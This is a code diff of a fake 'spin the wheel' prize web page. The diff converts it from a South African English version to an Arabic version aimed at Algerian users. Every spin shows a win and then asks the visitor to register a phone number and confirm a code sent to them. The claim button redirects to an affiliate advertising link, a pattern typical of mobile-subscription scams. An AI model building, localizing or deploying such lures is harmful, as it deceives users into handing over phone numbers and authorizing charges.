@@ -1,40 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Spin & Win - South Africa</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>عجلة الحظ - اربح الآن!</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f4f7f9;
+      font-family: 'Cairo', sans-serif;
+      text-align: center;
+      background: #f7f9fb;
+      direction: rtl;
       margin: 0;
       padding: 0;
-      text-align: center;
     }
-
     h1 {
+      margin-top: 25px;
       color: #2c3e50;
-      margin-top: 20px;
       font-size: 24px;
+      padding: 0 10px;
     }
-
     #wheelContainer {
       position: relative;
       margin: 30px auto;
-      width: 320px;
-      height: 320px;
+      width: 90vw;
+      max-width: 380px;
+      height: 90vw;
+      max-height: 380px;
     }
-
     #wheel {
       width: 100%;
       height: 100%;
       border-radius: 50%;
-      border: 8px solid #27ae60;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border: 6px solid #3498db;
+      box-shadow: 0 0 10px rgba(0,0,0,0.15);
       transition: transform 5s ease-out;
     }
-
     #pointer {
       width: 0;
       height: 0;
@@ -42,102 +42,69 @@
       border-right: 20px solid transparent;
       border-bottom: 30px solid #e74c3c;
       position: absolute;
-      top: -30px;
+      top: -25px;
       left: 50%;
       transform: translateX(-50%);
     }
-
     #spinBtn {
-      padding: 15px 30px;
+      margin-top: 20px;
+      padding: 15px 40px;
+      font-size: 20px;
+      background-color: #27ae60;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #resultBox {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #ffffff;
+      border: 2px solid #3498db;
+      padding: 25px;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      z-index: 999;
+      display: none;
+    }
+    #resultBox p {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    #claimBtn {
+      padding: 12px 25px;
       font-size: 18px;
       background-color: #2980b9;
       color: white;
       border: none;
       border-radius: 6px;
       cursor: pointer;
-      margin-top: 20px;
     }
-
-    #spinBtn:hover {
+    #spinBtn:hover, #claimBtn:hover {
       background-color: #1c669d;
-    }
-
-    #overlay {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0,0,0,0.7);
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
-
-    #modal {
-      background: #fff;
-      padding: 25px;
-      max-width: 90%;
-      border-radius: 10px;
-      text-align: center;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-    }
-
-    #modal h2 {
-      color: #27ae60;
-      margin-bottom: 15px;
-    }
-
-    #modal p {
-      color: #333;
-      margin-bottom: 20px;
-      font-size: 16px;
-    }
-
-    #claimBtn {
-      padding: 12px 25px;
-      background-color: #e67e22;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    #claimBtn:hover {
-      background-color: #d35400;
-    }
-
-    @media (max-width: 480px) {
-      h1 {
-        font-size: 20px;
-      }
-      #modal h2 {
-        font-size: 20px;
-      }
-      #modal p {
-        font-size: 15px;
-      }
     }
   </style>
 </head>
 <body>
 
-  <h1>🎉 Spin & Win in South Africa!</h1>
+  <h1>🎉 لف عجلة الحظ واربح جائزتك!</h1>
 
   <div id="wheelContainer">
     <div id="pointer"></div>
-    <canvas id="wheel" width="320" height="320"></canvas>
+    <canvas id="wheel" width="380" height="380"></canvas>
   </div>
 
-  <button id="spinBtn">Spin Now 🔄</button>
+  <button id="spinBtn">اضغط للّف 🔄</button>
 
-  <div id="overlay">
-    <div id="modal">
-      <h2>🎁 You won a prize!</h2>
-      <p>To claim your reward, please enter your phone number and confirm the code sent to you on the next page.</p>
-      <button id="claimBtn">Claim Prize</button>
-    </div>
+  <div id="resultBox">
+    <p id="resultText">🎁 مبروك! لقد ربحت...</p>
+    <p>للحصول على الجائزة، يجب تسجيل رقم الهاتف وتأكيد الكود المرسل إليك.</p>
+    <button id="claimBtn">استلام الجائزة</button>
   </div>
 
   <audio id="spinSound">
@@ -148,20 +115,21 @@
     const canvas = document.getElementById("wheel");
     const ctx = canvas.getContext("2d");
     const spinBtn = document.getElementById("spinBtn");
-    const spinSound = document.getElementById("spinSound");
-    const overlay = document.getElementById("overlay");
+    const resultBox = document.getElementById("resultBox");
+    const resultText = document.getElementById("resultText");
     const claimBtn = document.getElementById("claimBtn");
+    const spinSound = document.getElementById("spinSound");
 
     const prizes = [
-      "R1000 Cheque",
-      "iPhone 15",
-      "Takealot Voucher",
-      "Free Airtime"
+      "750 دينار",
+      "قسيمة واو ستور",
+      "iPhone 13",
+      "فليكسي 200 دج"
     ];
 
     const redirectURL = "https://max.bountyads.store/?utm_medium=c0ff8bdd1cc353aae59e78c3998924012afbc79a&utm_campaign=luckywheel";
 
-    const colors = ["#f1c40f", "#2ecc71", "#3498db", "#9b59b6"];
+    const colors = ["#74b9ff", "#ffeaa7", "#81ecec", "#fab1a0"];
     const arc = 2 * Math.PI / prizes.length;
 
     function drawWheel() {
@@ -169,20 +137,18 @@
       for (let i = 0; i < prizes.length; i++) {
         const start = i * arc;
         const end = start + arc;
-
         ctx.beginPath();
         ctx.fillStyle = colors[i];
-        ctx.moveTo(160, 160);
-        ctx.arc(160, 160, 160, start, end);
+        ctx.moveTo(190, 190);
+        ctx.arc(190, 190, 190, start, end);
         ctx.fill();
-
         ctx.save();
-        ctx.translate(160, 160);
+        ctx.translate(190, 190);
         ctx.rotate(start + arc / 2);
         ctx.textAlign = "center";
-        ctx.fillStyle = "#ffffff";
-        ctx.font = "bold 14px Arial";
-        ctx.fillText(prizes[i], 100, 10);
+        ctx.fillStyle = "#2c3e50";
+        ctx.font = "bold 20px Cairo";
+        ctx.fillText(prizes[i], 110, 10);
         ctx.restore();
       }
     }
@@ -195,7 +161,7 @@
       spinSound.play();
 
       const randomSpin = Math.floor(Math.random() * prizes.length);
-      const spins = 6;
+      const spins = 5;
       const degreesPerSegment = 360 / prizes.length;
       const finalAngle = (spins * 360) + (randomSpin * degreesPerSegment) + (degreesPerSegment / 2);
 
@@ -203,16 +169,16 @@
       canvas.style.transform = `rotate(${finalAngle}deg)`;
 
       setTimeout(() => {
-        overlay.style.display = "flex";
+        resultText.innerHTML = `🎁 مبروك! لقد ربحت: <strong>${prizes[randomSpin]}</strong>`;
+        resultBox.style.display = "block";
       }, 5200);
     });
 
-    claimBtn.onclick = () => {
+    claimBtn.addEventListener("click", () => {
       window.location.href = redirectURL;
-    };
+    });
   </script>
 
 </body>
 </html>
-
 
